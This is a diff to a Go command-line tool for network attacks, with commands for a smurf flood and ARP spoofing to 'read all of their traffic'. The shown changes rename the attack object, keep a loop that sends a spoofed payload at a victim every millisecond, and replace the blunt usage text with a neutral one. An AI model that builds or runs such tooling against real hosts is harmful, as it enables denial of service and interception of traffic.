@@ -35,15 +35,15 @@ func smurfHandler(ctx *cli.Context) error {
 		return errors.Wrap(err, "could not parse gateway MAC address")
 	}
 
-	s, err := newSmurf(victim, proxy, ctx.String(name(ifaceFlag)), gw)
+	p, err := newPwner(victim, proxy, ctx.String(name(ifaceFlag)), gw)
 	if err != nil {
 		return err
 	}
 
 	interval := time.Millisecond * 1
-	fmt.Printf(banner, victim, proxy, interval.String(), hex.Dump(s.payload))
+	fmt.Printf(banner, victim, proxy, interval.String(), hex.Dump(p.payload))
 	for {
-		if err = s.execute(); err != nil {
+		if err = p.execute(); err != nil {
 			return err
 		}
 		time.Sleep(interval)
@@ -54,7 +54,7 @@ func main() {
 	app := cli.NewApp()
 	app.Version = version
 	app.EnableBashCompletion = true
-	app.Usage = "carry out a smurf attack!"
+	app.Usage = "a utility for injecting spoofed frames into a live link"
 	app.Commands = []cli.Command{
 		{
 			Name:    "smurf",
@@ -73,11 +73,8 @@ func main() {
 			Name:    "arpspoof",
 			Aliases: []string{"a"},
 			Usage:   "spoof a host's arp cache and read all of their traffic",
-			Flags: []cli.Flag{
-				asMandatory(victimFlag),
-				asMandatory(proxyFlag),
-				withDefault(gatewayFlag, "192.168.1.254"),
-				withDefault(ifaceFlag, "en0"),
+			Flags:   []cli.Flag{
+				// TODO: flags
 			},
 			// TODO: before and action
 		},
